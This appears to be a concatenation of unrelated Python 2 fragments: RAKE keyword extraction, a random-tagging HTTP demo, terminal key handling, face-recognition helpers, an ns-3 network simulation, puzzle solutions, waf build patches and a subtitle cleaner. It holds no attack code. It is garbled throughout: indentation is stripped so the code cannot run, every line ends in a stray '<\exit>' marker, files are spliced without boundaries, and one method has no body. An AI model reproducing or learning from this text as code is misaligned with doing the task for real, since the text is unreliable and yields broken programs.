i += 1<\exit>
suffix.reverse()<\exit>
prefix = ''.join(prefix)<\exit>
suffix = ''.join(suffix)<\exit>
return (prefix, suffix)<\exit>
def is_rotated(seq1, seq2):<\exit>
if len(seq1) != len(seq2):<\exit>
return False<\exit>
start_indexes = []<\exit>
head_item = seq2[0]<\exit>
for index1 in range(len(seq1)):<\exit>
if seq1[index1] == head_item:<\exit>
start_indexes.append(index1)<\exit>
double_seq1 = seq1 + seq1<\exit>
for index1 in start_indexes:<\exit>
if double_seq1[index1:index1+len(seq1)] == seq2:<\exit>
return True<\exit>
return False<\exit>
def getmodule(obj):<\exit>
if hasattr(obj, 'func_globals'):<\exit>
func = obj<\exit>
else:<\exit>
func = None<\exit>
for item in obj.__dict__.values():<\exit>
if hasattr(item, 'func_globals'):<\exit>
func = item<\exit>
break<\exit>
if func is None:<\exit>
raise ValueError("No functions attached to object: %r" % obj)<\exit>
module_name = func.func_globals['__name__']<\exit>
module = sys.modules[module_name]<\exit>
return module<\exit>
def round_grid(value, grid, mode=0):<\exit>
off_grid = value % grid<\exit>
if mode == 0:<\exit>
add_one = int(off_grid >= (grid / 2.0))<\exit>
elif mode == 1 and off_grid:<\exit>
add_one = 1<\exit>
elif mode == -1 and off_grid:<\exit>
add_one = 0<\exit>
result = ((int(value / grid) + add_one) * grid)<\exit>
return result<\exit>
def get_args(argv):<\exit>
d = {}<\exit>
args = []<\exit>
for arg in argv:<\exit>
if arg.startswith('-'):<\exit>
parts = re.sub(r'^-+', '', arg).split('=')<\exit>
if len(parts) == 2:<\exit>
d[parts[0]] = parts[1]<\exit>
else:<\exit>
d[parts[0]] = None<\exit>
else:<\exit>
args.append(arg)<\exit>
d['args'] = args<\exit>
return d<\exit>
if __name__ == '__main__':<\exit>
import doctest<\exit>
doctest.testmod(sys.modules['__main__'])<\exit>
import re<\exit>
import operator<\exit>
import os<\exit>
BASE_DIR = (os.path.dirname(os.path.abspath(__file__)))<\exit>
debug = False<\exit>
def is_number(s):<\exit>
try:<\exit>
float(s) if '.' in s else int(s)<\exit>
return True<\exit>
except ValueError:<\exit>
return False<\exit>
def load_stop_words(stop_word_file):<\exit>
stop_words = []<\exit>
for line in open(stop_word_file):<\exit>
if line.strip()[0:1] != "#":<\exit>
for word in line.split():<\exit>
stop_words.append(word)<\exit>
return stop_words<\exit>
def separate_words(text, min_word_return_size):<\exit>
splitter = re.compile(r'[^a-zA-Z0-9_\+\-/]')<\exit>
words = []<\exit>
for single_word in splitter.split(text):<\exit>
current_word = single_word.strip().lower()<\exit>
if len(current_word) > min_word_return_size and current_word != '' and not is_number(current_word):<\exit>
words.append(current_word)<\exit>
return words<\exit>
def split_sentences(text):<\exit>
sentence_delimiters = re.compile(r'[!\?;:\[\]\t\"\(\)]|\s\-\s|[^0-9],[^a-zA-Z0-9]|\.[^a-zA-Z0-9]|\.$')<\exit>
sentences = sentence_delimiters.split(text)<\exit>
return sentences<\exit>
def build_stop_word_regex(stop_word_file_path):<\exit>
stop_word_list = load_stop_words(stop_word_file_path)<\exit>
stop_word_regex_list = []<\exit>
for word in stop_word_list:<\exit>
word_regex = r'\b'+word+r'(?![\w-])'<\exit>
stop_word_regex_list.append(word_regex)<\exit>
stop_word_pattern = re.compile('|'.join(stop_word_regex_list), re.IGNORECASE)<\exit>
return stop_word_pattern<\exit>
def generate_candidate_keywords(sentence_list, stopword_pattern):<\exit>
phrase_list = []<\exit>
for s in sentence_list:<\exit>
tmp = re.sub(stopword_pattern, '|', s.strip())<\exit>
phrases = tmp.split("|")<\exit>
for phrase in phrases:<\exit>
phrase = phrase.strip().lower()<\exit>
if phrase != "":<\exit>
phrase_list.append(phrase)<\exit>
return phrase_list<\exit>
def calculate_word_scores(phraseList):<\exit>
word_frequency = {}<\exit>
word_degree = {}<\exit>
for phrase in phraseList:<\exit>
word_list = separate_words(phrase, 0)<\exit>
word_list_length = len(word_list)<\exit>
word_list_degree = word_list_length-1<\exit>
for word in word_list:<\exit>
word_frequency.setdefault(word, 0)<\exit>
word_frequency[word] += 1<\exit>
word_degree.setdefault(word, 0)<\exit>
word_degree[word] += word_list_degree<\exit>
for item in word_frequency:<\exit>
word_degree[item] = word_degree[item]+word_frequency[item]<\exit>
word_score = {}<\exit>
for item in word_frequency:<\exit>
word_score.setdefault(item, 0)<\exit>
word_score[item] = word_degree[item]/(word_frequency[item]*1.0)<\exit>
return word_score<\exit>
def generate_candidate_keyword_scores(phrase_list, word_score):<\exit>
keyword_candidates = {}<\exit>
for phrase in phrase_list:<\exit>
keyword_candidates.setdefault(phrase, 0)<\exit>
word_list = separate_words(phrase, 0)<\exit>
candidate_score = 0<\exit>
for word in word_list:<\exit>
candidate_score += word_score[word]<\exit>
keyword_candidates[phrase] = candidate_score<\exit>
return keyword_candidates<\exit>
class Rake(object):<\exit>
def __init__(self, stop_words_path=os.path.join(BASE_DIR, "SmartStoplist.txt")):<\exit>
self.stop_words_path = stop_words_path<\exit>
self.__stop_words_pattern = build_stop_word_regex(stop_words_path)<\exit>
def run(self, text):<\exit>
sentence_list = split_sentences(text)<\exit>
phrase_list = generate_candidate_keywords(sentence_list, self.__stop_words_pattern)<\exit>
word_scores = calculate_word_scores(phrase_list)<\exit>
keyword_candidates = generate_candidate_keyword_scores(phrase_list, word_scores)<\exit>
sorted_keywords = sorted(keyword_candidates.iteritems(), key=operator.itemgetter(1), reverse=True)<\exit>
return sorted_keywords<\exit>
if __name__ == "__main__":<\exit>
text = "Compatibility of systems of linear constraints over the set of natural numbers. Criteria of compatibility of a system of linear Diophantine equations, strict inequations, and nonstrict inequations are considered. Upper bounds for components of a minimal set of solutions and algorithms of construction of minimal generating sets of solutions for all types of systems are given. These criteria and the corresponding algorithms for constructing a minimal supporting set of solutions can be used in solving all the considered types of systems and systems of mixed types."<\exit>
sentenceList = split_sentences(text)<\exit>
stoppath = os.path.join(BASE_DIR, "SmartStoplist.txt")<\exit>
stopwordpattern = build_stop_word_regex(stoppath)<\exit>
phraseList = generate_candidate_keywords(sentenceList, stopwordpattern)<\exit>
wordscores = calculate_word_scores(phraseList)<\exit>
keywordcandidates = generate_candidate_keyword_scores(phraseList, wordscores)<\exit>
if debug: print keywordcandidates<\exit>
sortedKeywords = sorted(keywordcandidates.iteritems(), key=operator.itemgetter(1), reverse=True)<\exit>
if debug: print sortedKeywords<\exit>
totalKeywords = len(sortedKeywords)<\exit>
if debug: print totalKeywords<\exit>
print sortedKeywords[0:(totalKeywords/3)]<\exit>
rake = Rake(stoppath)<\exit>
keywords = rake.run(text)<\exit>
print keywords<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
n, a, b = map(int, f.readline().strip().split(' '))<\exit>
D = map(int, f.readline().strip().split(' '))<\exit>
cipher = n, a, b, D<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from argparse import ArgumentParser<\exit>
from cgi import FieldStorage<\exit>
try:<\exit>
from json import dumps<\exit>
except ImportError:<\exit>
from sys import path as sys_path<\exit>
from os.path import join as path_join<\exit>
from os.path import dirname<\exit>
sys_path.append(path_join(dirname(__file__), '../server/lib/ujson'))<\exit>
from ujson import dumps<\exit>
from random import choice, randint<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
try:<\exit>
from urlparse import parse_qs<\exit>
except ImportError:<\exit>
from cgi import parse_qs<\exit>
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler<\exit>
ARGPARSER = ArgumentParser(description='An example HTTP tagging service, '<\exit>
'tagging Confuse-a-Cat **AND** Dead-parrot mentions!')<\exit>
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,<\exit>
help='port to run the HTTP service on (default: 47111)')<\exit>
def _random_span(text):<\exit>
attempt = 1<\exit>
while True:<\exit>
start = randint(0, len(text))<\exit>
end = randint(start + 3, start + 25)<\exit>
if (<\exit>
end > len(text) or<\exit>
'\n' in text[start:end] or<\exit>
(text[start:end][-1] == ' ' or text[start:end][0] == ' ')<\exit>
):<\exit>
if attempt >= 100:<\exit>
return None, None, None<\exit>
attempt += 1<\exit>
continue<\exit>
else:<\exit>
return start, end, text[start:end]<\exit>
def _random_tagger(text):<\exit>
anns = {}<\exit>
if not text:<\exit>
return anns<\exit>
num_anns = randint(1, len(text) / 100)<\exit>
for ann_num in xrange(num_anns):<\exit>
ann_id = 'T%d' % ann_num<\exit>
_type = choice(('Confuse-a-Cat', 'Dead-parrot', ))<\exit>
start, end, span_text = _random_span(text)<\exit>
if start is None:<\exit>
continue<\exit>
anns[ann_id] = {<\exit>
'type': _type,<\exit>
'offsets': ((start, end), ),<\exit>
'texts': (span_text, ),<\exit>
}<\exit>
return anns<\exit>
class RandomTaggerHandler(BaseHTTPRequestHandler):<\exit>
def do_POST(self):<\exit>
field_storage = FieldStorage(<\exit>
headers=self.headers,<\exit>
environ={<\exit>
'REQUEST_METHOD':'POST',<\exit>
'CONTENT_TYPE':self.headers['Content-type'],<\exit>
},<\exit>
fp=self.rfile)<\exit>
try:<\exit>
json_dic = _random_tagger(field_storage.value.decode('utf-8'))<\exit>
except KeyError:<\exit>
json_dic = {}<\exit>
self.send_response(200)<\exit>
self.send_header('Content-type', 'application/json; charset=utf-8')<\exit>
self.end_headers()<\exit>
self.wfile.write(dumps(json_dic))<\exit>
print >> stderr, ('Generated %d random annotations' % len(json_dic))<\exit>
def log_message(self, format, *args):<\exit>
return<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
server_class = HTTPServer<\exit>
httpd = server_class(('localhost', argp.port), RandomTaggerHandler)<\exit>
print >> stderr, 'Random tagger service started on port %s' % (argp.port)<\exit>
try:<\exit>
httpd.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
httpd.server_close()<\exit>
print >> stderr, 'Random tagger service stopped'<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
percol.import_keymap({<\exit>
"C-h" : lambda percol: percol.command.delete_backward_char(),<\exit>
"C-d" : lambda percol: percol.command.delete_forward_char(),<\exit>
"C-k" : lambda percol: percol.command.kill_end_of_line(),<\exit>
"C-y" : lambda percol: percol.command.yank(),<\exit>
"C-t" : lambda percol: percol.command.transpose_chars(),<\exit>
"C-a" : lambda percol: percol.command.beginning_of_line(),<\exit>
"C-e" : lambda percol: percol.command.end_of_line(),<\exit>
"C-b" : lambda percol: percol.command.backward_char(),<\exit>
"C-f" : lambda percol: percol.command.forward_char(),<\exit>
"M-f" : lambda percol: percol.command.forward_word(),<\exit>
"M-b" : lambda percol: percol.command.backward_word(),<\exit>
"M-d" : lambda percol: percol.command.delete_forward_word(),<\exit>
"M-h" : lambda percol: percol.command.delete_backward_word(),<\exit>
"C-n" : lambda percol: percol.command.select_next(),<\exit>
"C-p" : lambda percol: percol.command.select_previous(),<\exit>
"C-v" : lambda percol: percol.command.select_next_page(),<\exit>
"M-v" : lambda percol: percol.command.select_previous_page(),<\exit>
"M-<" : lambda percol: percol.command.select_top(),<\exit>
"M->" : lambda percol: percol.command.select_bottom(),<\exit>
"C-m" : lambda percol: percol.finish(),<\exit>
"C-j" : lambda percol: percol.finish(),<\exit>
"C-g" : lambda percol: percol.cancel(),<\exit>
})<\exit>
import sys<\exit>
import tty<\exit>
import termios<\exit>
import fcntl<\exit>
import os<\exit>
from . import keys<\exit>
def get_symbol():<\exit>
ch = read_char()<\exit>
ch_code = ord(ch)<\exit>
if ch_code == keys.ESC:<\exit>
ch = read_char_no_blocking()<\exit>
if ch == '':<\exit>
return keys.ESC<\exit>
elif ch != 'O' and ch != '[':<\exit>
return ord(ch)<\exit>
else:<\exit>
ch = read_char_no_blocking()<\exit>
if ch == 'A':<\exit>
return keys.UP<\exit>
elif ch == 'B':<\exit>
return keys.DOWN<\exit>
elif ch == 'C':<\exit>
return keys.RIGHT<\exit>
elif ch == 'D':<\exit>
return keys.LEFT<\exit>
elif ch == 'Z':<\exit>
return keys.SHIFTTAB<\exit>
return ch_code<\exit>
def read_char():<\exit>
fd = sys.stdin.fileno()<\exit>
old_settings = termios.tcgetattr(fd)<\exit>
try:<\exit>
tty.setraw(fd, termios.TCSADRAIN)<\exit>
ch = sys.stdin.read(1)<\exit>
finally:<\exit>
termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)<\exit>
return ch<\exit>
def read_char_no_blocking():<\exit>
fd = sys.stdin.fileno()<\exit>
old_settings = termios.tcgetattr(fd)<\exit>
old_flags = fcntl.fcntl(fd, fcntl.F_GETFL)<\exit>
try:<\exit>
tty.setraw(fd, termios.TCSADRAIN)<\exit>
fcntl.fcntl(fd, fcntl.F_SETFL, old_flags | os.O_NONBLOCK)<\exit>
return sys.stdin.read(1)<\exit>
except IOError as e:<\exit>
ErrorNumber = e[0]<\exit>
if (sys.platform.startswith("linux") and ErrorNumber != 11) or (sys.platform == "darwin" and ErrorNumber != 35):<\exit>
raise<\exit>
return ""<\exit>
finally:<\exit>
fcntl.fcntl(fd, fcntl.F_SETFL, old_flags)<\exit>
termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)<\exit>
import linecache<\exit>
import random<\exit>
class ReadFile(object):<\exit>
def __init__(self, pth1, num=None):<\exit>
self.pth1 = pth1<\exit>
self.num = num<\exit>
linecache.clearcache()<\exit>
self.total = int(linecache.getline(pth1, 1))<\exit>
if num == None:<\exit>
self.num = self.total<\exit>
def __get_line_label(self, tmp, rand):<\exit>
if rand:<\exit>
line_label = random.sample(tmp, self.num)<\exit>
else:<\exit>
line_label = tmp[:self.num]<\exit>
return line_label<\exit>
def person_pair(self):<\exit>
person = []<\exit>
tmp = range(2, self.total + 2)<\exit>
if self.num != self.total:<\exit>
line_label = self.__get_line_label(tmp, False)<\exit>
for i in line_label:<\exit>
person.append(self.__extract_flnm(i))<\exit>
else:<\exit>
for i in tmp:<\exit>
person.append(self.__extract_flnm(i))<\exit>
return person<\exit>
def person_mispair(self):<\exit>
person = []<\exit>
tmp = range(self.total + 2, self.total * 2 + 2)<\exit>
if self.num != self.total:<\exit>
line_label = random.sample(tmp, self.num)<\exit>
for i in range(len(line_label)):<\exit>
person.append(self.__extract_flnm(line_label[i]))<\exit>
else:<\exit>
for i in tmp:<\exit>
person.append(self.__extract_flnm(i))<\exit>
return person<\exit>
def __extract_flnm(self, line_label):<\exit>
tmp = linecache.getline(self.pth1, line_label)<\exit>
tmp = tmp.split()<\exit>
suffix = '.txt'<\exit>
if len(tmp) == 3:<\exit>
flag = 1<\exit>
fl_nm1 = tmp[0] + '_' + '0'*(4 - len(tmp[1])) + tmp[1] + suffix<\exit>
fl_nm2 = tmp[0] + '_' + '0'*(4 - len(tmp[2])) + tmp[2] + suffix<\exit>
else:<\exit>
flag = -1<\exit>
fl_nm1 = tmp[0] + '_' + '0'*(4 - len(tmp[1])) + tmp[1] + suffix<\exit>
fl_nm2 = tmp[2] + '_' + '0'*(4 - len(tmp[3])) + tmp[3] + suffix<\exit>
pair_info = [fl_nm1, fl_nm2, flag]<\exit>
return pair_info<\exit>
import sys<\exit>
import os<\exit>
import numpy as np<\exit>
from PIL import Image<\exit>
import re<\exit>
def read_images(path, sz=None):<\exit>
c = 0<\exit>
X, y = [], []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
subject_path = os.path.join(dirname, subdirname)<\exit>
for filename in os.listdir(subject_path):<\exit>
try:<\exit>
if not re.search(r"\.pgm$|\.jpg$", filename):<\exit>
continue<\exit>
if re.search(r"P00_Ambient\.pgm", filename):<\exit>
continue<\exit>
im = Image.open(os.path.join(subject_path, filename))<\exit>
im = im.convert("L")<\exit>
if sz is not None:<\exit>
im = im.resize(sz, Image.ANTIALIAS)<\exit>
X.append(np.asarray(im, dtype=np.uint8))<\exit>
y.append(c)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
c += 1<\exit>
return [X, y]<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.csma<\exit>
import ns.internet<\exit>
import ns.network<\exit>
def main(argv):<\exit>
cmd = ns.core.CommandLine()<\exit>
cmd.Parse(argv)<\exit>
ns.core.GlobalValue.Bind("SimulatorImplementationType", ns.core.StringValue("ns3::RealtimeSimulatorImpl"))<\exit>
print "Create nodes."<\exit>
n = ns.network.NodeContainer()<\exit>
n.Create(4)<\exit>
internet = ns.internet.InternetStackHelper()<\exit>
internet.Install(n)<\exit>
print ("Create channels.")<\exit>
csma = ns.csma.CsmaHelper()<\exit>
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)))<\exit>
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)));<\exit>
csma.SetDeviceAttribute("Mtu", ns.core.UintegerValue(1400))<\exit>
d = csma.Install(n)<\exit>
print ("Assign IP Addresses.")<\exit>
ipv4 = ns.internet.Ipv4AddressHelper()<\exit>
ipv4.SetBase(ns.network.Ipv4Address("10.1.1.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
i = ipv4.Assign(d)<\exit>
print ("Create Applications.")<\exit>
port = 9<\exit>
server = ns.applications.UdpEchoServerHelper(port)<\exit>
apps = server.Install(n.Get(1))<\exit>
apps.Start(ns.core.Seconds(1.0))<\exit>
apps.Stop(ns.core.Seconds(10.0))<\exit>
packetSize = 1024<\exit>
maxPacketCount = 500<\exit>
interPacketInterval = ns.core.Seconds(0.01)<\exit>
client = ns.applications.UdpEchoClientHelper(i.GetAddress (1), port)<\exit>
client.SetAttribute("MaxPackets", ns.core.UintegerValue(maxPacketCount))<\exit>
client.SetAttribute("Interval", ns.core.TimeValue(interPacketInterval))<\exit>
client.SetAttribute("PacketSize", ns.core.UintegerValue(packetSize))<\exit>
apps = client.Install(n.Get(0))<\exit>
apps.Start(ns.core.Seconds(2.0))<\exit>
apps.Stop(ns.core.Seconds(10.0))<\exit>
ascii = ns.network.AsciiTraceHelper()<\exit>
csma.EnableAsciiAll(ascii.CreateFileStream("realtime-udp-echo.tr"))<\exit>
csma.EnablePcapAll("realtime-udp-echo", False)<\exit>
print ("Run Simulation.")<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
print ("Done.")<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
import csv, os, sys<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
import numpy as np<\exit>
from facerec.feature import ChainOperator, Fisherfaces<\exit>
from facerec.preprocessing import Resize<\exit>
from facerec.dataset import NumericDataSet<\exit>
from facerec.distance import EuclideanDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.validation import KFoldCrossValidation<\exit>
from facerec.serialization import save_model, load_model<\exit>
class PredictableModelWrapper(object):<\exit>
def __init__(self, model):<\exit>
self.model = model<\exit>
self.numeric_dataset = NumericDataSet()<\exit>
def compute(self):<\exit>
X,y = self.numeric_dataset.get()<\exit>
self.model.compute(X,y)<\exit>
def set_data(self, numeric_dataset):<\exit>
self.numeric_dataset = numeric_dataset<\exit>
def predict(self, image):<\exit>
prediction_result = self.model.predict(image)<\exit>
num_label = prediction_result[0]<\exit>
str_label = self.numeric_dataset.resolve_by_num(num_label)<\exit>
return str_label<\exit>
def update(self, name, image):<\exit>
self.numeric_dataset.add(name, image)<\exit>
class_label = self.numeric_dataset.resolve_by_str(name)<\exit>
extracted_feature = self.feature.extract(image)<\exit>
self.classifier.update(extracted_feature, class_label)<\exit>
def __repr__(self):<\exit>
return "PredictableModelWrapper (Inner Model=%s)" % (str(self.model))<\exit>
def get_model(numeric_dataset, model_filename=None):<\exit>
feature = ChainOperator(Resize((128,128)), Fisherfaces())<\exit>
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)<\exit>
inner_model = PredictableModel(feature=feature, classifier=classifier)<\exit>
model = PredictableModelWrapper(inner_model)<\exit>
model.set_data(numeric_dataset)<\exit>
model.compute()<\exit>
if not model_filename is None:<\exit>
save_model(model_filename, model)<\exit>
return model<\exit>
def read_images(path, identifier, numeric_dataset):<\exit>
for filename in os.listdir(path):<\exit>
try:<\exit>
img = Image.open(os.path.join(path, filename))<\exit>
img = img.convert("L")<\exit>
img = np.asarray(img, dtype=np.uint8)<\exit>
numeric_dataset.add(identifier, img)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
def read_from_csv(filename):<\exit>
numeric_dataset = NumericDataSet()<\exit>
with open(filename, 'rb') as csvfile:<\exit>
reader = csv.reader(csvfile, delimiter=';', quotechar='#')<\exit>
for row in reader:<\exit>
identifier = row[0]<\exit>
path = row[1]<\exit>
read_images(path, identifier, numeric_dataset)<\exit>
return numeric_dataset<\exit>
def get_model_from_csv(filename, out_model_filename):<\exit>
numeric_dataset = read_from_csv(filename)<\exit>
model = get_model(numeric_dataset, out_model_filename)<\exit>
return model<\exit>
def load_model_file(model_filename):<\exit>
load_model(model_filename)<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
return self.sum_prime(self.get_configs(cipher))<\exit>
def get_configs(self, N):<\exit>
if N < 4:<\exit>
return 1<\exit>
F = [0 for _ in xrange(N + 1)]<\exit>
for i in xrange(1, 4):<\exit>
F[i] = 1<\exit>
F[4] = 2<\exit>
for i in xrange(5, N + 1):<\exit>
F[i] = F[i - 4] + F[i - 1]<\exit>
return F[N]<\exit>
def prime(self, n):<\exit>
is_prime = [1 for _ in xrange(n + 1)]<\exit>
for i in xrange(2):<\exit>
is_prime[i] = 0<\exit>
n_max = int(math.sqrt(len(is_prime)))<\exit>
for i in xrange(2, n_max + 1):<\exit>
for j in xrange(2 * i, len(is_prime), i):<\exit>
is_prime[j] = 0<\exit>
return sum(is_prime)<\exit>
def sum_prime(self, n):<\exit>
import numpy as np<\exit>
is_prime = np.ones((n + 1,), dtype=bool)<\exit>
is_prime[:2] = 0<\exit>
N_max = int(np.sqrt(len(is_prime)))<\exit>
for j in xrange(2, N_max):<\exit>
is_prime[2 * j::j] = False<\exit>
return np.sum(is_prime)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class ListNode(object):<\exit>
def __init__(self, val, next=None):<\exit>
self.val = val<\exit>
self.next = next<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def rehashing(self, hashTable):<\exit>
cap = len(hashTable)<\exit>
cap *= 2<\exit>
ht = [None for _ in xrange(cap)]<\exit>
for node in hashTable:<\exit>
while node:<\exit>
self.__rehash(ht, ListNode(node.val))<\exit>
node = node.next<\exit>
return ht<\exit>
def __rehash(self, ht, node):<\exit>
code = self.__hashcode(node.val, len(ht))<\exit>
if ht[code] is None:<\exit>
ht[code] = node<\exit>
else:<\exit>
cur = ht[code]<\exit>
while cur.next:<\exit>
cur = cur.next<\exit>
cur.next = node<\exit>
def __hashcode(self, key, capacity):<\exit>
return key%capacity<\exit>
if __name__ == "__main__":<\exit>
hashTable = [None for _ in xrange(3)]<\exit>
n0 = ListNode(29)<\exit>
n1 = ListNode(5)<\exit>
n0.next = n1<\exit>
hashTable[2] = n0<\exit>
print Solution().rehashing(hashTable)<\exit>
import ann_to_xml<\exit>
import info_extraction<\exit>
import os<\exit>
import sys<\exit>
def relation_evaluate(file_path):<\exit>
global tp, fp, fn<\exit>
set_original = ann_to_xml.get_relation_set(file_path+".ann")<\exit>
extract_engine = info_extraction.InfoExtraction()<\exit>
set_extracted = extract_engine.extract_file(file_path+"-tagged.xml", "relation")<\exit>
tp += len(set_original.intersection(set_original, set_extracted))<\exit>
fp += len(set_extracted - set_original)<\exit>
fn += len(set_original - set_extracted)<\exit>
if __name__ == '__main__':<\exit>
if len(sys.argv)==1:<\exit>
print "usage: python relation_evaluate.py [data_folder relative name]"<\exit>
print "example: python relative_evaluate.py non-auto"<\exit>
sys.exit(0)<\exit>
else:<\exit>
folder_name = sys.argv[1]<\exit>
tp = fp = fn = 0<\exit>
current_directory = os.path.dirname(os.path.realpath(__file__))<\exit>
for i in range(1,33):<\exit>
relation_evaluate(os.path.join(current_directory, folder_name, str(i)))<\exit>
print "******summary*********"<\exit>
print "tp: %d\nfp: %d\nfn: %d" % (tp, fp, fn)<\exit>
print "f1: %f" % (float(2*tp)/(2*tp+fp+fn))<\exit>
print "recall: %f" % (float(tp)/(tp+fn))<\exit>
import os<\exit>
from waflib import Build, ConfigSet, Task, Utils, Errors<\exit>
from waflib.TaskGen import feature, before_method, after_method<\exit>
EXTRA_LOCK = '.old_srcdir'<\exit>
old1 = Build.BuildContext.store<\exit>
def store(self):<\exit>
old1(self)<\exit>
db = os.path.join(self.variant_dir, EXTRA_LOCK)<\exit>
env = ConfigSet.ConfigSet()<\exit>
env.SRCDIR = self.srcnode.abspath()<\exit>
env.store(db)<\exit>
Build.BuildContext.store = store<\exit>
old2 = Build.BuildContext.init_dirs<\exit>
def init_dirs(self):<\exit>
if not (os.path.isabs(self.top_dir) and os.path.isabs(self.out_dir)):<\exit>
raise Errors.WafError('The project was not configured: run "waf configure" first!')<\exit>
srcdir = None<\exit>
db = os.path.join(self.variant_dir, EXTRA_LOCK)<\exit>
env = ConfigSet.ConfigSet()<\exit>
try:<\exit>
env.load(db)<\exit>
srcdir = env.SRCDIR<\exit>
except:<\exit>
pass<\exit>
if srcdir:<\exit>
d = self.root.find_node(srcdir)<\exit>
if d and srcdir != self.top_dir and getattr(d, 'children', ''):<\exit>
srcnode = self.root.make_node(self.top_dir)<\exit>
print("relocating the source directory %r -> %r" % (srcdir, self.top_dir))<\exit>
srcnode.children = {}<\exit>
for (k, v) in d.children.items():<\exit>
srcnode.children[k] = v<\exit>
v.parent = srcnode<\exit>
d.children = {}<\exit>
old2(self)<\exit>
Build.BuildContext.init_dirs = init_dirs<\exit>
def uid(self):<\exit>
try:<\exit>
return self.uid_<\exit>
except AttributeError:<\exit>
m = Utils.md5()<\exit>
up = m.update<\exit>
up(self.__class__.__name__.encode())<\exit>
for x in self.inputs + self.outputs:<\exit>
up(x.path_from(x.ctx.srcnode).encode())<\exit>
self.uid_ = m.digest()<\exit>
return self.uid_<\exit>
Task.Task.uid = uid<\exit>
@feature('c', 'cxx', 'd', 'go', 'asm', 'fc', 'includes')<\exit>
@after_method('propagate_uselib_vars', 'process_source')<\exit>
def apply_incpaths(self):<\exit>
lst = self.to_incnodes(self.to_list(getattr(self, 'includes', [])) + self.env['INCLUDES'])<\exit>
self.includes_nodes = lst<\exit>
bld = self.bld<\exit>
self.env['INCPATHS'] = [x.is_child_of(bld.srcnode) and x.path_from(bld.srcnode) or x.abspath() for x in lst]<\exit>
class TreeNode:<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def removeNode(self, root, value):<\exit>
return self.__removeNode(root, None, value)<\exit>
def __removeNode(self, root, parent, value):<\exit>
if not root:<\exit>
return<\exit>
if root.val > value:<\exit>
self.__removeNode(root.left, root, value)<\exit>
elif root.val < value:<\exit>
self.__removeNode(root.right, root, value)<\exit>
else:<\exit>
if not root.left and not root.right:<\exit>
if parent:<\exit>
if parent.left == root:<\exit>
parent.left = None<\exit>
else:<\exit>
parent.right = None<\exit>
else:<\exit>
root = None<\exit>
elif root.left and not root.right or root.right and not root.left:<\exit>
if root.left:<\exit>
if parent:<\exit>
if parent.left == root:<\exit>
parent.left = root.left<\exit>
else:<\exit>
parent.right = root.left<\exit>
else:<\exit>
root = root.left<\exit>
else:<\exit>
if parent:<\exit>
if parent.left == root:<\exit>
parent.left = root.right<\exit>
else:<\exit>
parent.right = root.right<\exit>
else:<\exit>
root = root.right<\exit>
else:<\exit>
cur = root.left<\exit>
while cur.right:<\exit>
cur = cur.right<\exit>
root.val = cur.val<\exit>
self.__removeNode(root.left, root, cur.val)<\exit>
return root<\exit>
import re<\exit>
import os<\exit>
texts = []<\exit>
directory = os.path.dirname(os.path.realpath(__file__))<\exit>
for root, dirs, files in os.walk(directory):<\exit>
for file in files:<\exit>
if file.endswith(".srt"):<\exit>
f=open(os.path.join(root,file), 'r')<\exit>
texts.append((file,f.read()))<\exit>
f.close()<\exit>
p1 = re.compile(('^\d+$'))<\exit>
p2 = re.compile(('\d\d:\d\d:\d\d'))<\exit>
for videoName, videoTexts in texts:<\exit>
transcripts = ''<\exit>
lines = videoTexts.splitlines()<\exit>
for line in lines:<\exit>
if not (p1.search(line) or p2.search(line) or len(line) < 1):<\exit>
transcripts += (line+'\n')<\exit>
f = open(videoName[:len(videoName)-4]+'_cleaned.txt','w')<\exit>
f.write(transcripts)<\exit>
print(videoName + ' has been cleaned.')<\exit>
f.close()<\exit>
try:<\exit>
from urllib.parse import urlencode<\exit>
except ImportError:<\exit>
from urllib import urlencode<\exit>
from .filepost import encode_multipart_formdata<\exit>
__all__ = ['RequestMethods']<\exit>
class RequestMethods(object):<\exit>
_encode_url_methods = set(['DELETE', 'GET', 'HEAD', 'OPTIONS'])<\exit>
_encode_body_methods = set(['PATCH', 'POST', 'PUT', 'TRACE'])<\exit>
def __init__(self, headers=None):<\exit>
self.headers = headers or {}<\exit>
